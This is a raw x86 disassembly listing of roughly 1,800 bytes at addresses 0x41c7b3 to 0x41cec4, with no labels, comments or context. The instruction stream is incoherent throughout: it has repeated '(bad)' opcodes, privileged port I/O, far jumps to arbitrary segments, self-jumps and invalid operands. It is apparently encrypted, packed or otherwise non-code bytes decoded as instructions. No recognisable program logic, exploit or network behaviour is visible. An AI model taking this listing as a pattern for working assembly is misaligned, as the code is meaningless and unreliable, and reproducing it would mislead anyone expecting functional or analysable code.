  41c7b3:	xlat   BYTE PTR ds:[ebx]
  41c7b4:	mov    esi,0x7f6f57bf
  41c7b9:	ja     0x41c784
  41c7bb:	pop    ds
  41c7bc:	out    0xfc,eax
  41c7be:	into   
  41c7bf:	cmp    eax,0xb1c729af
  41c7c4:	les    ebx,FWORD PTR [ecx+0x40be0b69]
  41c7ca:	jne    0x41c823
  41c7cc:	mov    ebp,0xcf739777
  41c7d1:	stc    
  41c7d2:	sub    eax,0xe27adfdf
  41c7d7:	cmp    BYTE PTR [esi+0x69],ah
  41c7da:	stc    
  41c7db:	sub    BYTE PTR [ebp+0x2453c05d],0x49
  41c7e2:	int3   
  41c7e3:	fstp   DWORD PTR [ecx-0x7d]
  41c7e6:	(bad)  
  41c7e7:	(bad)  
  41c7e8:	push   ds
  41c7e9:	push   edx
  41c7ea:	sub    dl,BYTE PTR [edi-0x19a5a5a7]
  41c7f0:	in     eax,dx
  41c7f1:	mov    bh,0xdf
  41c7f3:	(bad)  
  41c7f4:	repz jge 0x41c7e1
  41c7f7:	arpl   WORD PTR [ebp-0x43],si
  41c7fa:	daa    
  41c7fb:	inc    eax
  41c7fc:	loopne 0x41c7b1
  41c7fe:	mov    esp,0xcececcbc
  41c803:	push   cs
  41c804:	fwait
  41c805:	sbb    ecx,edi
  41c807:	sbb    ah,al
  41c809:	inc    ebx
  41c80a:	pop    ebp
  41c80b:	jae    0x41c87e
  41c80d:	jo     0x41c7cf
  41c80f:	ficom  DWORD PTR [ebx+0x16161635]
  41c815:	je     0x41c7d6
  41c817:	shl    BYTE PTR [edi],0x6b
  41c81a:	in     al,dx
  41c81b:	out    dx,al
  41c81c:	in     al,dx
  41c81d:	jb     0x41c898
  41c81f:	jne    0x41c7b6
  41c821:	repz out 0x39,al
  41c824:	das    
  41c825:	ss aaa 
  41c827:	jne    0x41c7e6
  41c829:	inc    ebp
  41c82a:	mov    edi,0x758df3c7
  41c82f:	cs pop esi
  41c831:	pop    edx
  41c832:	in     eax,0xc5
  41c834:	out    0x26,al
  41c836:	(bad)  [esi+0x17]
  41c839:	fild   QWORD PTR [ebx]
  41c83b:	push   eax
  41c83c:	dec    ecx
  41c83d:	call   0xb300:0xe5007b4
  41c844:	inc    BYTE PTR [ebp+0x13293720]
  41c84a:	mov    ds:0x2cbb305c,eax
  41c84f:	mov    DWORD PTR [edx+0x71],esi
  41c852:	dec    ebp
  41c853:	dec    ebp
  41c854:	or     al,0x22
  41c856:	push   eax
  41c857:	push   es
  41c858:	and    bh,BYTE PTR [eax-0x1a]
  41c85b:	test   esp,0xfdaa0ef8
  41c861:	mov    ds:0xe67e009f,eax
  41c866:	and    esi,0xffffff93
  41c869:	(bad)  
  41c86b:	icebp  
  41c86c:	fisub  DWORD PTR [ebx]
  41c86e:	xor    BYTE PTR [ebp+0x4193fd9f],0xb4
  41c875:	repz ficomp WORD PTR [edi+0x65cd7b2d]
  41c87c:	bound  esi,QWORD PTR gs:[edx+eiz*8-0x5296bc24]
  41c884:	psubusb mm5,QWORD PTR [ebp+0x5bee04ae]
  41c88b:	cwde   
  41c88c:	outs   dx,DWORD PTR ds:[esi]
  41c88d:	cwde   
  41c88e:	ds add eax,0x9a6d93bb
  41c894:	jmp    0x26cb:0xe0d095c5
  41c89b:	or     al,0xfb
  41c89d:	jge    0x41c879
  41c89f:	sub    ebx,DWORD PTR [edi]
  41c8a1:	bound  esi,QWORD PTR gs:[esi-0x77]
  41c8a5:	pop    edx
  41c8a6:	mov    ch,0xc2
  41c8a8:	and    BYTE PTR [esi],bl
  41c8aa:	push   edx
  41c8ab:	scas   eax,DWORD PTR es:[edi]
  41c8ac:	xlat   BYTE PTR ds:[ebx]
  41c8ad:	mov    eax,0x7b12f174
  41c8b2:	sti    
  41c8b3:	sti    
  41c8b4:	aam    0xc7
  41c8b6:	(bad)  
  41c8b7:	cdq    
  41c8b8:	fwait
  41c8b9:	fwait
  41c8ba:	jecxz  0x41c8b0
  41c8bc:	hlt    
  41c8bd:	xchg   esp,eax
  41c8be:	shl    bh,0xb9
  41c8c1:	jbe    0x41c8c0
  41c8c3:	cmp    al,bl
  41c8c5:	loope  0x41c857
  41c8c7:	and    al,0x4e
  41c8c9:	dec    esp
  41c8ca:	jg     0x41c8cb
  41c8cc:	sub    DWORD PTR [edx+0x145112a5],ecx
  41c8d2:	xchg   ecx,eax
  41c8d3:	les    ebx,FWORD PTR [edx]
  41c8d5:	outs   dx,BYTE PTR ds:[esi]
  41c8d6:	sub    al,0x2d
  41c8d8:	cs jb  0x41c8b1
  41c8db:	push   0x3c1e0f0
  41c8e0:	cli    
  41c8e1:	mov    ebp,0x9142851e
  41c8e6:	(bad)  
  41c8e7:	fstp   DWORD PTR [ecx+0x14afe9ee]
  41c8ed:	aaa    
  41c8ee:	outs   dx,BYTE PTR ds:[esi]
  41c8ef:	fisub  WORD PTR [edx+0x3130a952]
  41c8f5:	cmp    DWORD PTR [ecx-0x5b],ecx
  41c8f8:	push   edx
  41c8f9:	loope  0x41c8e3
  41c8fb:	call   0x43c54c80
  41c900:	sub    ah,ch
  41c902:	or     cl,dl
  41c904:	push   ebx
  41c905:	in     al,dx
  41c906:	out    dx,al
  41c907:	call   0x8a7289f6
  41c90c:	mov    eax,0x9316f371
  41c911:	adc    edx,DWORD PTR [ebx-0x5fa0d0d4]
  41c917:	ss push esi
  41c919:	jecxz  0x41c8f9
  41c91b:	jnp    0x41c994
  41c91d:	pop    ecx
  41c91e:	pop    ebx
  41c91f:	pop    ebx
  41c920:	mov    ds:0x1f53efdf,eax
  41c925:	pop    ds
  41c926:	daa    
  41c927:	sub    dl,BYTE PTR [esp+esi*2]
  41c92a:	pop    ebx
  41c92b:	lock test DWORD PTR [ebp-0x1e],eax
  41c92f:	cmp    BYTE PTR [esi+0x6f],ah
  41c932:	outs   dx,DWORD PTR ds:[esi]
  41c933:	(bad)  
  41c934:	jle    0x41c8f5
  41c936:	inc    edi
  41c937:	mov    cl,0x58
  41c939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c93a:	shr    DWORD PTR [eax+0x72],1
  41c93d:	jbe    0x41c915
  41c93f:	pusha  
  41c940:	lods   al,BYTE PTR ds:[esi]
  41c941:	ss (bad) 
  41c943:	cld    
  41c944:	cld    
  41c945:	cmp    al,0x4a
  41c947:	inc    ecx
  41c948:	mov    ds:0xd15ca0d1,eax
  41c94d:	mov    ebx,0x6ceeed1b
  41c952:	xchg   ebx,eax
  41c953:	and    al,0x31
  41c955:	xor    esi,DWORD PTR [ebx-0x7272738d]
  41c95b:	mov    cl,0xb7
  41c95d:	mov    ebx,0x818e30c7
  41c962:	mov    WORD PTR [esi-0x55],cs
  41c965:	inc    ebp
  41c966:	mov    bh,0xd7
  41c968:	arpl   WORD PTR [ecx+0x79],di
  41c96b:	sbb    edi,ebx
  41c96d:	idiv   DWORD PTR [ecx-0x4f]
  41c970:	stc    
  41c971:	xor    BYTE PTR [ebp-0x6db77039],0x84
  41c978:	leave  
  41c979:	test   eax,0xea262629
  41c97e:	sub    al,0x2f
  41c980:	pop    edi
  41c981:	pusha  
  41c982:	popa   
  41c983:	jno    0x41c906
  41c985:	mov    ebx,0x6f63df77
  41c98a:	addr16 xchg edi,eax
  41c98c:	pop    esi
  41c98d:	scas   eax,DWORD PTR es:[edi]
  41c98e:	(bad)  
  41c98f:	in     eax,dx
  41c990:	aaa    
  41c991:	out    dx,al
  41c992:	push   eax
  41c993:	sub    BYTE PTR [esi],dl
  41c995:	sbb    DWORD PTR [esi+eax*1],ecx
  41c998:	mov    al,ds:0x16adda3c
  41c99d:	mov    ebp,0x4b959f7e
  41c9a2:	xchg   edi,eax
  41c9a3:	sbb    DWORD PTR [edi],ebx
  41c9a5:	pop    ds
  41c9a6:	out    0xd1,eax
  41c9a8:	add    DWORD PTR [edi],0xffffffec
  41c9ab:	out    dx,al
  41c9ac:	in     eax,dx
  41c9ad:	inc    edx
  41c9ae:	call   0xcfce:0x15cae572
  41c9b5:	pop    ebx
  41c9b6:	pushf  
  41c9b7:	sahf   
  41c9b8:	pushf  
  41c9b9:	adc    bh,al
  41c9bb:	mov    cl,0x6e
  41c9bd:	aaa    
  41c9be:	ds cmp eax,0xb85f2c5
  41c9c4:	mov    ah,0xdb
  41c9c6:	ins    DWORD PTR es:[edi],dx
  41c9c7:	div    BYTE PTR [esi+0x77]
  41c9ca:	pop    eax
  41c9cb:	pop    esp
  41c9cc:	pop    edx
  41c9cd:	bound  ebp,QWORD PTR [edx+0x6a]
  41c9d0:	xchg   ch,dh
  41c9d2:	cmc    
  41c9d3:	jne    0x41c96f
  41c9d5:	lea    eax,[esi]
  41c9d7:	lds    edx,FWORD PTR [edx-0x67]
  41c9da:	loope  0x41c98c
  41c9dc:	iret   
  41c9dd:	cli    
  41c9de:	cli    
  41c9df:	cmp    dh,cl
  41c9e1:	jo     0x41c9ab
  41c9e3:	int3   
  41c9e4:	int3   
  41c9e5:	sub    al,0x4f
  41c9e7:	lahf   
  41c9e8:	ds loope 0x41c9d3
  41c9eb:	clc    
  41c9ec:	nop
  41c9ed:	(bad)  
  41c9ef:	pop    ecx
  41c9f0:	mov    dh,0x5e
  41c9f2:	mov    esp,0x88e8e8e0
  41c9f7:	inc    edx
  41c9f8:	push   esp
  41c9f9:	pusha  
  41c9fa:	addr16 addr16 fwait
  41c9fd:	icebp  
  41c9fe:	icebp  
  41c9ff:	or     edx,ecx
  41ca01:	mov    ch,0xa
  41ca03:	aad    0x7b
  41ca05:	mov    edi,0x516ed646
  41ca0a:	sub    DWORD PTR [ecx-0x7b],ebp
  41ca0d:	loopne 0x41c9b8
  41ca0f:	sbb    al,0x9
  41ca11:	dec    eax
  41ca12:	call   0x2ec30c66
  41ca17:	sub    dl,BYTE PTR [eax+0x5071568d]
  41ca1d:	or     ecx,0x41
  41ca20:	rol    DWORD PTR [edi+0x20f7cef9],cl
  41ca26:	sbb    ecx,DWORD PTR [edi+eiz*2]
  41ca29:	jg     0x41ca1f
  41ca2b:	pop    edi
  41ca2c:	std    
  41ca2d:	aaa    
  41ca2e:	(bad)  
  41ca2f:	cli    
  41ca30:	das    
  41ca31:	cld    
  41ca32:	cli    
  41ca33:	cmp    ebp,ebp
  41ca35:	neg    DWORD PTR [ebx-0x384081c1]
  41ca3b:	imul   ecx,DWORD PTR [edi-0x3a053e00],0x6b
  41ca42:	popa   
  41ca43:	imul   DWORD PTR [di+0x24]
  41ca47:	neg    BYTE PTR [edi+0x1857a66a]
  41ca4d:	addr16 mov al,ds:0x7461
  41ca51:	iret   
  41ca52:	add    DWORD PTR [ecx+0x22a4be09],0xffffffa5
  41ca59:	popf   
  41ca5a:	out    dx,eax
  41ca5b:	xchg   edx,eax
  41ca5c:	pop    eax
  41ca5d:	or     eax,DWORD PTR [ecx]
  41ca5f:	fwait
  41ca60:	cmp    esp,DWORD PTR [eax-0x1e]
  41ca63:	mov    esi,0xfb4e1483
  41ca68:	push   eax
  41ca69:	dec    esi
  41ca6a:	xchg   DWORD PTR [edi+esi*2],edx
  41ca6d:	fbld   TBYTE PTR [ebx]
  41ca6f:	pop    ebx
  41ca70:	mov    ecx,0x66ddbb43
  41ca75:	jbe    0x41cadd
  41ca77:	xchg   BYTE PTR [edx-0x4b],ch
  41ca7a:	inc    esp
  41ca7b:	mov    eax,ds:0x7575615c
  41ca80:	xchg   ebp,eax
  41ca81:	inc    edx
  41ca82:	mov    eax,ds:0xe552b540
  41ca87:	repnz jmp 0xa580:0xc1c3002a
  41ca8f:	lds    esp,FWORD PTR ds:0x49bd45b2
  41ca95:	(bad)  
  41ca96:	jns    0x41cacb
  41ca98:	mov    dh,0xc9
  41ca9a:	cmp    BYTE PTR [edi],cl
  41ca9c:	pop    ds
  41ca9d:	mov    al,ds:0x144e7e75
  41caa3:	push   es
  41caa4:	data16 jnp 0x41ca95
  41caa7:	mov    ebx,es
  41caa9:	ret    
  41caaa:	add    edx,DWORD PTR [esi+0x7db89797]
  41cab0:	sti    
  41cab1:	ss dec edi
  41cab3:	lahf   
  41cab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cab6:	pop    edx
  41cab7:	lods   eax,DWORD PTR ds:[esi]
  41cab8:	jb     0x41cb30
  41caba:	jp     0x41ca3e
  41cabc:	push   edx
  41cabd:	mov    ch,BYTE PTR [edx-0x5b]
  41cac0:	ret    0xd4f4
  41cac3:	adc    al,0xbf
  41cac5:	repz lea esp,[edi-0x29072aca]
  41cacc:	in     eax,dx
  41cacd:	cmp    ebx,DWORD PTR [esi+edi*4+0x7c]
  41cad1:	test   DWORD PTR [ebp+0x26265dfd],edi
  41cad7:	daa    
  41cad8:	fcomp  st(7)
  41cada:	fbld   TBYTE PTR [ebx-0x56ac9523]
  41cae0:	(bad)  
  41cae1:	sub    BYTE PTR [edi],al
  41cae3:	add    DWORD PTR [ebp-0x2188b88a],ebx
  41cae9:	cmp    eax,0x1f23e7d8
  41caee:	stc    
  41caef:	or     BYTE PTR [ebx-0xb],ah
  41caf2:	cmp    dh,bl
  41caf4:	repz repz int3 
  41caf7:	int    0xcf
  41caf9:	mov    bl,0xf6
  41cafb:	clc    
  41cafc:	xor    DWORD PTR [edi],ecx
  41cafe:	out    dx,al
  41caff:	ffreep st(3)
  41cb01:	test   DWORD PTR [ebx-0x40],0xdbedcee3
  41cb08:	push   esp
  41cb09:	sub    edx,DWORD PTR ds:0x48a7a6a6
  41cb0f:	mov    bl,0x8c
  41cb11:	outs   dx,DWORD PTR ds:[esi]
  41cb12:	jle    0x41cb07
  41cb14:	pop    ebx
  41cb15:	pushf  
  41cb16:	pushf  
  41cb17:	pushf  
  41cb18:	jo     0x41cb8e
  41cb1a:	je     0x41cae0
  41cb1c:	popf   
  41cb1d:	cmp    esi,DWORD PTR [edi-0x8]
  41cb20:	clc    
  41cb21:	daa    
  41cb22:	shl    DWORD PTR ds:[eax+0x6979603f],0x89
  41cb2a:	mov    ch,0xa7
  41cb2c:	dec    edi
  41cb2d:	js     0x41cb23
  41cb2f:	loopne 0x41cb42
  41cb31:	sahf   
  41cb32:	out    dx,eax
  41cb33:	icebp  
  41cb34:	jge    0x41cad5
  41cb36:	cli    
  41cb37:	ds fdivp st(2),st
  41cb3a:	fadd   st,st(7)
  41cb3c:	pop    eax
  41cb3d:	pop    eax
  41cb3e:	pop    edx
  41cb3f:	bound  ebp,QWORD PTR [esi+0x7e]
  41cb42:	mov    ?,WORD PTR [ebx+0x36365393]
  41cb48:	(bad)  
  41cb49:	jmp    0x9fde4643
  41cb4e:	lahf   
  41cb4f:	jae    0x41cb3c
  41cb51:	(bad)  
  41cb52:	sub    eax,0x388a38c3
  41cb57:	dec    ecx
  41cb58:	sub    BYTE PTR [edx+ecx*1],dl
  41cb5b:	js     0x41cafb
  41cb5d:	bound  edi,QWORD PTR [edx+0x66]
  41cb60:	xchg   bl,dl
  41cb62:	jecxz  0x41cbc7
  41cb64:	pop    esi
  41cb65:	mov    esi,0xdedec97c
  41cb6a:	scas   al,BYTE PTR es:[edi]
  41cb6b:	scas   al,BYTE PTR es:[edi]
  41cb6c:	pop    ebp
  41cb6d:	mov    eax,0xc9898d76
  41cb72:	or     DWORD PTR [edx-0x3b9bff58],esp
  41cb78:	dec    ecx
  41cb79:	dec    esp
  41cb7a:	loopne 0x41cb77
  41cb7c:	dec    esp
  41cb7d:	dec    ebp
  41cb7e:	dec    edi
  41cb7f:	mov    cl,0x7f
  41cb81:	mov    al,0xc7
  41cb83:	cli    
  41cb84:	shl    DWORD PTR [ebp-0x72],cl
  41cb87:	push   cs
  41cb88:	psubw  mm3,mm0
  41cb8b:	fistp  DWORD PTR [edi]
  41cb8d:	addr16 stc 
  41cb8f:	ret    0xdeb2
  41cb92:	sub    esi,DWORD PTR [eax+0x7f]
  41cb95:	(bad)  
  41cb96:	and    BYTE PTR [eax],cl
  41cb98:	jns    0x41cb7d
  41cb9a:	and    ebx,DWORD PTR [edi]
  41cb9c:	bound  esp,QWORD PTR gs:[edx+0x1c]
  41cba0:	das    
  41cba1:	or     BYTE PTR [eax+0x64],dl
  41cba4:	aam    0xc7
  41cba6:	jne    0x41cbf3
  41cba8:	mov    al,0xad
  41cbaa:	pop    ss
  41cbab:	fwait
  41cbac:	hlt    
  41cbad:	mov    edx,0x5757163d
  41cbb2:	cmp    DWORD PTR [esi],edi
  41cbb4:	cmp    ah,al
  41cbb6:	in     al,dx
  41cbb7:	hlt    
  41cbb8:	xchg   esp,eax
  41cbb9:	dec    edx
  41cbba:	mov    ecx,0xe2d5ab4c
  41cbbf:	clc    
  41cbc0:	call   0x53ac64d
  41cbc5:	inc    ecx
  41cbc6:	adc    al,0x92
  41cbc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbc9:	sbb    DWORD PTR [ebx],esi
  41cbcb:	or     ecx,DWORD PTR [ebx+0x64]
  41cbce:	addr16 fwait
  41cbd0:	clc    
  41cbd1:	int    0x43
  41cbd3:	mov    edx,0x94a7f468
  41cbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbd9:	xchg   ebp,eax
  41cbda:	and    al,0x35
  41cbdc:	fwait
  41cbdd:	lods   eax,DWORD PTR ds:[esi]
  41cbde:	sbb    bl,dl
  41cbe0:	dec    ecx
  41cbe1:	xor    esp,ebx
  41cbe3:	cmp    edx,DWORD PTR [edx]
  41cbe5:	pop    edi
  41cbe6:	and    DWORD PTR [ecx-0x5d7ac767],0x314a1249
  41cbf0:	sti    
  41cbf1:	daa    
  41cbf2:	bound  eax,QWORD PTR [esp+eax*4-0x7c33565f]
  41cbf9:	xor    bh,ch
  41cbfb:	leave  
  41cbfc:	loop   0x41cbd7
  41cbfe:	jecxz  0x41cc3f
  41cc00:	or     al,0xfc
  41cc02:	in     eax,dx
  41cc03:	out    dx,eax
  41cc04:	xor    eax,0x8faf7c3f
  41cc09:	xlat   BYTE PTR ds:[ebx]
  41cc0a:	pop    esi
  41cc0b:	add    BYTE PTR [ebx+ebx*1-0x41],ah
  41cc0f:	mul    bl
  41cc11:	xchg   ecx,eax
  41cc12:	pop    ds
  41cc13:	xchg   DWORD PTR [edx],esp
  41cc15:	jns    0x41cbaa
  41cc17:	loope  0x41cbc1
  41cc19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc1a:	push   esi
  41cc1b:	or     DWORD PTR [edx],esp
  41cc1d:	xor    BYTE PTR [ebx-0x4cbc39a8],bl
  41cc23:	jne    0x41cbdb
  41cc25:	retf   0x51
  41cc28:	mov    es,WORD PTR [eax-0x50]
  41cc2b:	ficomp DWORD PTR [edi]
  41cc2d:	jge    0x41cc7c
  41cc2f:	imul   eax,DWORD PTR [eax],0xffffff83
  41cc32:	pop    eax
  41cc33:	ret    
  41cc34:	shr    cl,0xad
  41cc37:	outs   dx,DWORD PTR ds:[esi]
  41cc38:	jb     0x41cc38
  41cc3a:	test   BYTE PTR [edi+0x70],0x70
  41cc3e:	js     0x41cc0c
  41cc40:	in     al,0x64
  41cc42:	popf   
  41cc43:	icebp  
  41cc44:	icebp  
  41cc45:	and    eax,0xa98f8f4e
  41cc4a:	push   esi
  41cc4b:	sub    edx,esp
  41cc4d:	push   0x35
  41cc4f:	push   cs
  41cc50:	(bad)  
  41cc51:	(bad)
  41cc55:	shl    DWORD PTR [ebx],cl
  41cc57:	xor    ebp,esp
  41cc59:	out    dx,eax
  41cc5a:	imul   ebx,DWORD PTR [eax+0x7c],0x610ad2f1
  41cc61:	sbb    al,dh
  41cc63:	out    dx,al
  41cc64:	mov    ebx,0x5a92eaef
  41cc69:	shr    DWORD PTR [eax-0xc912a5e],cl
  41cc6f:	in     al,dx
  41cc70:	stc    
  41cc71:	jae    0x41cc51
  41cc73:	jp     0x41cc60
  41cc75:	sub    eax,0x3817db96
  41cc7a:	cmp    DWORD PTR ds:0xc2334d21,edi
  41cc80:	sub    BYTE PTR [edx-0x1b],ah
  41cc83:	loop   0x41ccca
  41cc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc88:	(bad)  
  41cc8a:	fabs   
  41cc8c:	leave  
  41cc8d:	fisub  DWORD PTR [ebx+0x6a]
  41cc90:	mov    ch,0x31
  41cc92:	xchg   edx,eax
  41cc93:	xor    al,0xa5
  41cc95:	pop    esp
  41cc96:	sub    al,0xe3
  41cc98:	xchg   DWORD PTR [ecx],edx
  41cc9a:	leave  
  41cc9b:	jo     0x41cce5
  41cc9d:	adc    al,0x85
  41cc9f:	aam    0x97
  41cca1:	push   ss
  41cca2:	test   eax,0xccccaad6
  41cca7:	dec    esp
  41cca8:	jae    0x41cca9
  41ccaa:	fidivr WORD PTR [ebp-0x12]
  41ccad:	fnstsw WORD PTR [ebx-0x1aad5ab9]
  41ccb3:	cli    
  41ccb4:	int    0x1b
  41ccb6:	pop    esp
  41ccb7:	mov    ebp,0x79e50d76
  41ccbc:	dec    esp
  41ccbd:	dec    esp
  41ccbe:	dec    esi
  41ccbf:	jb     0x41cd33
  41ccc1:	jb     0x41cd05
  41ccc3:	scas   eax,DWORD PTR es:[edi]
  41ccc4:	xlat   BYTE PTR ds:[ebx]
  41ccc5:	mov    ds:0xad536add,eax
  41ccca:	push   ebp
  41cccb:	add    eax,esi
  41cccd:	cmp    eax,0xa219389f
  41ccd2:	adc    al,0x84
  41ccd4:	push   ecx
  41ccd5:	dec    eax
  41ccd6:	mov    ch,0x56
  41ccd8:	mov    ds:0x8c332e52,eax
  41ccdd:	arpl   WORD PTR [edx],di
  41ccdf:	in     eax,dx
  41cce0:	push   cs
  41cce1:	std    
  41cce2:	jle    0x41cc73
  41cce4:	jbe    0x41cca1
  41cce6:	inc    ebx
  41cce7:	test   eax,0x3cf3c25c
  41ccec:	ficomp DWORD PTR [ebp-0x2c5781f2]
  41ccf2:	ja     0x41ccfb
  41ccf4:	ret    
  41ccf5:	and    DWORD PTR ds:[ecx],edx
  41ccf8:	pop    ecx
  41ccf9:	call   0x2ddb:0xb4878832
  41cd00:	call   0x133e:0xbdba2567
  41cd07:	adc    esp,ebx
  41cd09:	mov    ah,0x3a
  41cd0b:	sbb    eax,0xd8262626
  41cd10:	jl     0x41cd10
  41cd12:	pushf  
  41cd13:	(bad)  
  41cd14:	cmc    
  41cd15:	jne    0x41cd11
  41cd17:	std    
  41cd18:	add    DWORD PTR [edi-0x52],edx
  41cd1b:	pop    ebp
  41cd1c:	loope  0x41ccec
  41cd1e:	popf   
  41cd1f:	cmp    ecx,DWORD PTR [edi+ecx*2+0x4f]
  41cd23:	xor    esi,DWORD PTR [edi]
  41cd25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd26:	std    
  41cd27:	sbb    ebx,ebx
  41cd29:	fcmovnu st,st(3)
  41cd2b:	hlt    
  41cd2c:	jnp    0x41cd6b
  41cd2e:	xchg   BYTE PTR [ebx-0x9c35ae8],al
  41cd34:	div    edi
  41cd36:	mov    BYTE PTR [edi],al
  41cd38:	inc    ebx
  41cd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd3c:	mov    eax,0x9d26e371
  41cd41:	dec    esi
  41cd42:	pop    es
  41cd43:	mov    ebp,0x671ef2e3
  41cd48:	addr16 addr16 add al,0x61
  41cd4c:	les    esp,FWORD PTR [eax+0x30]
  41cd4f:	loopne 0x41cd2a
  41cd51:	mov    BYTE PTR [esi],0x8f
  41cd54:	pop    ds
  41cd55:	aas    
  41cd56:	mov    ds:0xa7c63636,al
  41cd5b:	ds stc 
  41cd5d:	imul   ecx,DWORD PTR [esi-0x31],0x3d3d384e
  41cd64:	add    eax,0xbd5eae32
  41cd69:	dec    edx
  41cd6a:	push   es
  41cd6b:	push   esp
  41cd6c:	dec    edx
  41cd6d:	and    eax,0xfcc0a8a2
  41cd72:	cld    
  41cd73:	add    dl,BYTE PTR [edi-0x52]
  41cd76:	pop    ebp
  41cd77:	in     eax,0xe8
  41cd79:	inc    eax
  41cd7a:	outs   dx,DWORD PTR ds:[esi]
  41cd7b:	(bad)  
  41cd7c:	mov    edx,0xa8857aba
  41cd81:	adc    cl,ah
  41cd83:	jns    0x41cda3
  41cd85:	pop    ss
  41cd86:	xchg   esi,eax
  41cd87:	jne    0x41cda2
  41cd89:	hlt    
  41cd8a:	loop   0x41cd4e
  41cd8c:	and    bl,BYTE PTR [esi-0x4f]
  41cd8f:	mov    WORD PTR [edx-0x10],?
  41cd92:	sub    edi,DWORD PTR [eax-0x3d]
  41cd95:	add    al,0x3c
  41cd97:	push   0xd42c610f
  41cd9c:	nop
  41cd9d:	aas    
  41cd9e:	dec    ecx
  41cd9f:	popa   
  41cda0:	enter  0x5d28,0xf9
  41cda4:	or     al,BYTE PTR [edx+0x63]
  41cda7:	push   edx
  41cda8:	es inc esi
  41cdaa:	and    BYTE PTR [esi+eax*8],al
  41cdad:	mov    WORD PTR [esp+edi*1-0x3aa6a0ec],ss
  41cdb4:	prefetcht1 BYTE PTR [ebx-0x57aee2ff]
  41cdbb:	push   ds
  41cdbc:	aas    
  41cdbd:	cli    
  41cdbe:	jno    0x41cdbe
  41cdc0:	cmp    DWORD PTR [eax],edx
  41cdc2:	add    BYTE PTR [edi-0xd0ff64b],ch
  41cdc8:	stos   DWORD PTR es:[edi],eax
  41cdc9:	jg     0x41ce20
  41cdcb:	jns    0x41cd5c
  41cdcd:	push   ecx
  41cdcf:	lahf   
  41cdd0:	lds    edi,FWORD PTR cs:[ebx-0x7a538ca9]
  41cdd7:	aad    0xde
  41cdd9:	sbb    ch,0x1e
  41cddc:	sbb    eax,DWORD PTR [edi]
  41cdde:	shl    BYTE PTR [edi-0x68],cl
  41cde1:	adc    BYTE PTR [ebp+0x79244cf9],cl
  41cde7:	xchg   esi,eax
  41cde8:	cmp    DWORD PTR [edx],eax
  41cdea:	ror    BYTE PTR [eax],0x87
  41cded:	mov    ebp,0x7a077416
  41cdf2:	out    0xdb,eax
  41cdf4:	push   0xffffffb7
  41cdf6:	dec    ebx
  41cdf7:	push   esi
  41cdf8:	(bad)  
  41cdf9:	fmul   DWORD PTR ds:0x1e6bd02f
  41cdff:	jb     0x41ce7a
  41ce01:	jne    0x41cd98
  41ce03:	fstp   QWORD PTR [ebp-0x303031e3]
  41ce09:	pop    ecx
  41ce0a:	pop    esp
  41ce0b:	pop    esp
  41ce0c:	bound  esi,QWORD PTR [edi+0x67]
  41ce0f:	fwait
  41ce10:	popf   
  41ce11:	in     eax,dx
  41ce12:	sbb    eax,0x39a6a7a6
  41ce17:	cmp    eax,0xcbe5e33b
  41ce1c:	pop    ss
  41ce1d:	(bad)
  41ce21:	mov    bh,BYTE PTR [eax]
  41ce23:	cmp    DWORD PTR [ecx],edi
  41ce25:	mov    eax,ds:0x36316add
  41ce2a:	push   esi
  41ce2b:	arpl   WORD PTR [esi+0x6e],bp
  41ce2e:	pop    esi
  41ce2f:	out    dx,eax
  41ce30:	add    al,0x54
  41ce32:	sub    al,0x32
  41ce34:	aas    
  41ce35:	aaa    
  41ce36:	retf   
  41ce37:	pop    eax
  41ce38:	mov    ebp,0x9cececce
  41ce3d:	test   eax,0xe8e2dc06
  41ce42:	call   0x7839a597
  41ce47:	ficomp DWORD PTR [esi+ebx*1]
  41ce4a:	sbb    al,0xd0
  41ce4c:	push   0xffffffb5
  41ce4e:	hlt    
  41ce4f:	es sbb al,0xd7
  41ce52:	scas   al,BYTE PTR es:[edi]
  41ce53:	loope  0x41ce80
  41ce55:	(bad)  
  41ce56:	fyl2xp1 
  41ce58:	jns    0x41ce0c
  41ce5a:	or     al,0xf6
  41ce5c:	dec    ebp
  41ce5d:	inc    ebp
  41ce5e:	pop    ebx
  41ce5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce60:	push   edx
  41ce61:	in     eax,0xac
  41ce63:	rcl    eax,1
  41ce65:	sahf   
  41ce66:	repnz pop esi
  41ce68:	lahf   
  41ce69:	retf   
  41ce6a:	xchg   edi,eax
  41ce6b:	cs jae 0x41ce57
  41ce6e:	repnz inc ebp
  41ce70:	retf   0xa95
  41ce73:	xchg   edi,eax
  41ce74:	cs pop ebp
  41ce76:	bound  ebx,QWORD PTR [eax]
  41ce78:	(bad)  
  41ce79:	mov    esp,0xec3bcefb
  41ce7e:	in     eax,dx
  41ce7f:	out    dx,al
  41ce80:	shr    bh,1
  41ce82:	cmc    
  41ce83:	mov    ecx,0xd51aed7a
  41ce88:	stos   BYTE PTR es:[edi],al
  41ce89:	outs   dx,BYTE PTR ds:[esi]
  41ce8a:	int    0x35
  41ce8c:	xor    eax,0xc6fac939
  41ce91:	cmp    cl,BYTE PTR [edi-0x1b1bc3e2]
  41ce97:	hlt    
  41ce98:	xchg   esp,eax
  41ce99:	push   0xffffffb5
  41ce9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce9c:	mov    ebp,DWORD PTR [ebp-0x6c]
  41ce9f:	(bad)  
  41cea0:	cmc    
  41cea1:	sbb    edx,edi
  41cea3:	push   0xf7bcdab7
  41cea8:	fidivr WORD PTR [ebx-0x44]
  41ceab:	fdivr  QWORD PTR [edx+0x9]
  41ceae:	shr    ah,0xec
  41ceb1:	sbb    al,0x61
  41ceb3:	push   esp
  41ceb4:	loopne 0x41ce80
  41ceb6:	jmp    0xee0f:0x18dab52a
  41cebd:	fucom  st(7)
  41cebf:	jmp    0x8788d5be
  41cec4:	pop    es
